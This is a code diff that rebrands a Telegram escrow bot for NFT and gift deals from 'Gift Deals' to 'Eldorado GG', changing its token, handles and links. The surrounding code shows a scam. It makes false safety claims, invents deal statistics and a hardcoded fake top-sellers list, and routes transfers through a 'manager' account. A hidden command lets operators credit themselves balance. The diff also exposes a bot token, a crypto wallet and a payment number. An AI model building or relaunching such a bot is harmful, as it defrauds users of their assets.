@@ -6,12 +6,12 @@ from telegram.ext import Application, CommandHandler, CallbackQueryHandler, Mess
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-BOT_TOKEN    = "8790434095:AAHblM59nn7fWTQpSQr7fH15mvM5e6w-Td8"
+BOT_TOKEN    = "8879343383:AAGO3viGf3PERRFA-c5Jx0Wz3cqm-tIj6J4"
 ADMIN_ID     = 8726084830
 ADMIN_IDS    = {8726084830, 90283607}
-BOT_USERNAME = "GiftDealsRebot"
-MANAGER_URL  = "https://t.me/GiftDealsManager"
-MANAGER_TAG  = "@GiftDealsManager"
+BOT_USERNAME = "EldoradoGGRobot"
+MANAGER_URL  = "https://t.me/EldoradoGGManager"
+MANAGER_TAG  = "@EldoradoGGManager"
 CRYPTO_ADDR  = "UQDGN5pfjPxorFyjN2xha84bapuADDtPcRofNDJ4dK2YXxZd"
 CRYPTO_BOT   = "https://t.me/send?start=IVbfPL7Tk4XA"
 CARD_NUM     = "+79041751408"
@@ -364,8 +364,8 @@ def main_kb(lang):
          InlineKeyboardButton(R(ru,'Топ продавцов','Top Sellers'),callback_data="menu_top",icon_custom_emoji_id="5258204546391351475")],
         [InlineKeyboardButton(R(ru,'Рефералы','Referrals'),callback_data="menu_ref",icon_custom_emoji_id="5258362837411045098"),
          InlineKeyboardButton(R(ru,'Реквизиты','Requisites'),callback_data="menu_req",icon_custom_emoji_id="5260730055880876557")],
-        [InlineKeyboardButton(R(ru,'Тех. поддержка','Tech Support'),url="https://t.me/GiftDealsSupport",icon_custom_emoji_id="5258260149037965799")],
-        [InlineKeyboardButton(R(ru,'Как проходят сделки','How deals work'),url="https://telegra.ph/Kak-prohodyat-sdelki-07-01",icon_custom_emoji_id="5409181322679706928")],
+        [InlineKeyboardButton(R(ru,'Тех. поддержка','Tech Support'),url="https://t.me/EldoradoGGSupport",icon_custom_emoji_id="5258260149037965799")],
+        [InlineKeyboardButton(R(ru,'Как проходят сделки','How deals work'),url="https://telegra.ph/Eldorado-GG-07-23",icon_custom_emoji_id="5409181322679706928")],
     ])
 
 def role_kb(lang):
@@ -483,13 +483,13 @@ def get_welcome(lang):
     ru=lang=="ru"
     if ru:
         pts=["Автоматические сделки с НФТ и подарками","Полная защита обеих сторон",
-             "Средства заморожены до подтверждения","Передача через менеджера: @GiftDealsManager"]
-        intro="Gift Deals - самая безопасная площадка для сделок в Telegram"
+             "Средства заморожены до подтверждения",f"Передача через менеджера: {MANAGER_TAG}"]
+        intro="Eldorado GG - самая безопасная площадка для сделок в Telegram"
         footer="Выберите действие ниже"; stats="37.700+ сделок · оборот $185.000"
     else:
         pts=["Automatic NFT & gift deals","Full protection for both parties",
-             "Funds frozen until confirmation","Transfer via manager: @GiftDealsManager"]
-        intro="Gift Deals - the safest platform for deals in Telegram"
+             "Funds frozen until confirmation",f"Transfer via manager: {MANAGER_TAG}"]
+        intro="Eldorado GG - the safest platform for deals in Telegram"
         footer="Choose an action below"; stats="37,700+ deals · $185,000 turnover"
     nums=[En1,En2,En3,En4]
     lines="\n".join(f"<blockquote><b>{nums[i]} {pts[i]}.</b></blockquote>" for i in range(4))
@@ -756,7 +756,7 @@ async def cmd_neptune(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if not update.message: return
         lang=get_lang(update.effective_user.id); ru=lang=="ru"
         text=(
-            f"{Ecwn} <b>{R(ru,'Gift Deals - Команды','Gift Deals - Commands')}</b>\n\n"
+            f"{Ecwn} <b>{R(ru,'Eldorado GG - Команды','Eldorado GG - Commands')}</b>\n\n"
             f"<blockquote>"
             f"{Eln} <b>/sendbalance [сумма]</b> - {R(ru,'выдать себе баланс','give yourself balance')}\n"
             f"<i>{R(ru,'Пример:','Example:')} /sendbalance 500</i>\n\n"
@@ -1848,7 +1848,7 @@ async def show_top(update, context):
             ("@jD4***m6",24100,376),("@yF1***c8",19800,294),("@nP6***z2",15300,221),("@cG3***v5",11700,168)
         ]
         dw=R(ru,"сделок","deals")
-        lines=[f"<b>{Ecwn} {R(ru,'Топ продавцов Gift Deals','Gift Deals Top Sellers')}</b>\n"]
+        lines=[f"<b>{Ecwn} {R(ru,'Топ продавцов Eldorado GG','Eldorado GG Top Sellers')}</b>\n"]
         for i,(u2,a,dd) in enumerate(TOP):
             medal = "🥇" if i==0 else "🥈" if i==1 else "🥉" if i==2 else f"{i+1}."
             lines.append(f"<b>{medal} {u2} - ${a} · {dd} {dw}</b>")
